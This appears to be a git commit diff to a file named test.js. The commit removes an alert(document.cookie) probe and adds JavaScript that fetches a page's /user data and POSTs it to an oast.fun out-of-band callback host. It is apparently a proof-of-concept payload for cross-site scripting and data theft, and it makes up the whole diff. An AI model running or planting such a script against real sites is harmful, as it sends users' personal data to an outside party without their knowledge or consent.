e622c9a8463e93c22607459d47ae95e128984490
0xffffff <76949603+bl1ck1337@users.noreply.github.com>
2023-12-20 13:41:15 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,5 +1,30 @@
-alert(document.cookie)
+const userEndpoint = 'http://example.com/user';
+const dataEndpoint = 'http://qllhsgebdomzecfjwwtrz9iwzjstvbaiu.oast.fun/poc';
 
-var secret = "yooooooooo it work"
-
-var auth = "js monitoring is powerfull af"
+// Fetch data from /user
+fetch(userEndpoint)
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`Failed to fetch user data. Status: ${response.status}`);
+    }
+    return response.text();
+  })
+  .then(userData => {
+    // Send user data to /data
+    return fetch(dataEndpoint, {
+      method: 'POST', // You can use 'GET' or 'POST' based on your server requirements
+      headers: {
+        'Content-Type': 'application/json', // Adjust the content type based on your data format
+      },
+      body: JSON.stringify({ userData }),
+    });
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`Failed to send data to /data. Status: ${response.status}`);
+    }
+    console.log('Data successfully sent to /data');
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
